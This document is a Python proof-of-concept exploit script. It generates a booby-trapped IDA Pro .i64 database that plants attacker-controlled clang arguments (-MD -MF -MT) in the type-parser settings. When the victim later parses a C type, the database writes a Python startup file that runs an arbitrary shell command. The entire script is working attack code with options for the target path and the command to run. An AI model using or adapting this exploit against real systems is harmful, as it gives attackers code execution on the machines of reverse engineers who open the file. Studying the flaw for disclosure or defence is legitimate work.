#!/usr/bin/env python3
"""
build_poc.py — Generate a malicious .i64 that achieves code execution
               when the victim parses a C header file.

Vulnerability: IDA Pro 9.x stores unsanitized CLANG_ARGV in the IDB
netnode "$ type parser". When the victim creates or edits a type using
the Local Types window (Shift+F1) with C syntax input, clang processes
these arguments including -MD -MF which writes an arbitrary file with
attacker-controlled content via -MT.

Usage:
  python3 build_poc.py --target-file PATH --command CMD --source-binary BIN [-o OUT]

  python3 build_poc.py --target-file ~/.idapro/idapythonrc.py --command id --source-binary /usr/bin/ls

Trigger: victim opens the .i64 and creates/edits a type in Local Types (Shift+F1)
         using the C syntax input box (e.g. types "struct foo { int x; };").

Requirements:
  - IDA Pro 9.x installed (uses idat for headless IDB creation)
"""

import argparse
import os
import sys
import subprocess
import tempfile
import shutil
import base64

# Default configuration
DEFAULT_OUTPUT = "malicious.i64"

def build_clang_argv(target_path, mt_payload):
    """Build the CLANG_ARGV that will be stored in the IDB."""
    encoded = mt_payload.encode().hex()
    escaped = target_path.replace('\\', '\\\\').replace('"', '\\"')
    return f'-x c -MD -MF "{escaped}" -MT \'__import__("os").system(bytes.fromhex("{encoded}"))\ndef a(): #\''


def parse_args():
    parser = argparse.ArgumentParser(
        description="Generate a malicious .i64 that achieves code execution "
                    "when the victim parses a C header file.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
examples:
  %(prog)s --target-file ~/.idapro/idapythonrc.py --command id --source-binary /usr/bin/ls
""",
    )
    parser.add_argument(
        "-o", "--output",
        default=DEFAULT_OUTPUT,
        help=f"output .i64 path (default: {DEFAULT_OUTPUT})",
    )
    parser.add_argument(
        "--target-file",
        required=True,
        help="path the payload will be written to on the victim's machine",
    )
    parser.add_argument(
        "--command",
        required=True,
        help="shell command to execute",
    )
    parser.add_argument(
        "--source-binary",
        required=True,
        help="binary to open in IDA for building the .i64",
    )
    return parser.parse_args()

def create_poc_script(clang_argv):
    """Create an IDAPython script that sets the CLANG_ARGV in the IDB."""
    return f'''
import ida_netnode
import ida_srclang
import ida_loader
import struct

# Set the parser to "clang" so the victim uses the clang parser
ida_srclang.select_parser_by_name("clang")

# Set the malicious CLANG_ARGV
CLANG_ARGV = """{clang_argv}"""
ida_srclang.set_parser_argv("clang", CLANG_ARGV)

# Also store in the "$ type parser" netnode for persistence
node = ida_netnode.netnode()
node.create("$ type parser")
argv_bytes = CLANG_ARGV.encode("utf-8") + b"\\x00"
node.supset(0xFFFFFFFE, argv_bytes, ord("S"))  # index -2, tag 'S'

# Store parser selection (clang = index in parser list)
# This ensures TYPE_PARSER=clang is set when the IDB is opened
flags = struct.pack("<Q", 0)  # language flags
node.supset(0xFFFFFFFC, flags, ord("A"))  # index -4, tag 'A'

# Force save
ida_loader.save_database("", 0)

print(f"[+] CLANG_ARGV set to: {{CLANG_ARGV}}")
print(f"[+] Parser set to: clang")
print(f"[+] Database saved")
'''

def find_ida_binary():
    """Find idat (headless IDA) for automated IDB creation."""
    candidates = [
        # macOS
        "/Applications/IDA Professional 9.3.app/Contents/MacOS/idat",
        "/Applications/IDA Professional 9.3.app/Contents/MacOS/ida",
        # Linux common paths
        "/opt/ida/idat",
        "/opt/idapro/idat",
        os.path.expanduser("~/ida/idat"),
        # From environment
        os.environ.get("IDAT", ""),
        os.environ.get("IDA_DIR", "") + "/idat" if os.environ.get("IDA_DIR") else "",
    ]

    for path in candidates:
        if path and os.path.isfile(path) and os.access(path, os.X_OK):
            return path
    return None

def main():
    args = parse_args()
    output = args.output
    shell_cmd = args.command
    target_file = os.path.expanduser(args.target_file)
    source_binary = args.source_binary
    clang_argv = build_clang_argv(target_file, shell_cmd)

    print(f"\n[*] Shell command: {shell_cmd}")
    print(f"[*] Target file: {target_file}")

    # Validate source binary
    if not os.path.isfile(source_binary):
        print(f"[-] Source binary not found: {source_binary}")
        sys.exit(1)
    print(f"[*] Source binary: {source_binary}")

    # Create IDAPython injection script
    script_content = create_poc_script(clang_argv)

    # Try automated IDB creation with idat
    idat = find_ida_binary()

    if idat:
        print(f"\n[*] Found IDA at: {idat}")

        with tempfile.TemporaryDirectory() as tmpdir:

            # Create injection script
            script_path = os.path.join(tmpdir, "inject.py")
            with open(script_path, "w") as f:
                f.write(script_content)
                f.write("\nimport idc\nidc.qexit(0)\n")

            # Run IDA headless
            idb_path = os.path.join(tmpdir, "target.i64")
            print(f"[*] Running IDA headless to create armed IDB...")

            cmd = [idat, "-A", f"-S{script_path}", "-o" + idb_path, source_binary]
            result = subprocess.run(cmd, capture_output=True, timeout=120)

            if os.path.exists(idb_path):
                shutil.copy2(idb_path, output)
                print(f"[+] Armed IDB written to: {output}")
            else:
                print(f"[-] IDA failed to create IDB")
                print(f"    stdout: {result.stdout.decode()[:200]}")
                print(f"    stderr: {result.stderr.decode()[:200]}")
                exit(1)
    else:
        print("[-] IDA not found :(")
        exit(1)

if __name__ == "__main__":
    main()
